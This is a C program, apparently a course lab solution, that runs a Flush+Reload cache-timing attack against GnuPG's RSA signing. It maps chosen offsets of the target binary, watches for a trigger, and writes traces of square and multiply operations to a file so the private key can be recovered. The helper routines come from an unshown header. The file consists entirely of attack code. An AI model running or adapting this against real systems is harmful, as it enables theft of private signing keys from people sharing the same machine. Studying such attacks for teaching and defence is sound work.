#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include "solution.h"

#define SAMPLES 100000
#define PERSIOD 10000

void monitor_rsa_signing(void *trigger, void *p1, void *p2, uint32_t period, uint32_t count, uint32_t *trace) {
    // Monitor the memory access during RSA signing
    monitor(trigger, period, count);
    // Trace squaring and multiplication operations
    fr_trace(p1, p2, period, count, trace);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <file> <offset1> <offset2>\n", argv[0]);
        return 1;
    }

    // Extract file and offsets
    char *file_name = argv[1];
    uint64_t offset1 = strtoull(argv[2], NULL, 10);
    uint64_t offset2 = strtoull(argv[3], NULL, 10);

    // Map the offsets
    void *p1 = map(file_name, offset1);
    void *p2 = map(file_name, offset2);
    void *trigger = map(file_name, 0);  // Access to trigger (can be mapped at the start of the file)

    if (!p1 || !p2 || !trigger) {
        printf("Mapping failed!\n");
        return 1;
    }

    uint32_t *trace = (uint32_t *)malloc(2 * SAMPLES * sizeof(uint32_t));  // Allocate space for trace
    if (!trace) {
        printf("Memory allocation failed!\n");
        return 1;
    }

    // Perform the monitoring and tracing during RSA signature
    monitor_rsa_signing(trigger, p1, p2, PERSIOD, SAMPLES, trace);

    // Save the trace results to file
    FILE *out = fopen("gnupg.txt", "w");
    if (!out) {
        printf("Failed to open output file\n");
        free(trace);
        return 1;
    }

    // Output the trace data
    for (uint32_t i = 0; i < SAMPLES; i++) {
        fprintf(out, "%u %u\n", trace[2 * i], trace[2 * i + 1]);
    }

    fclose(out);
    free(trace);
    return 0;
}
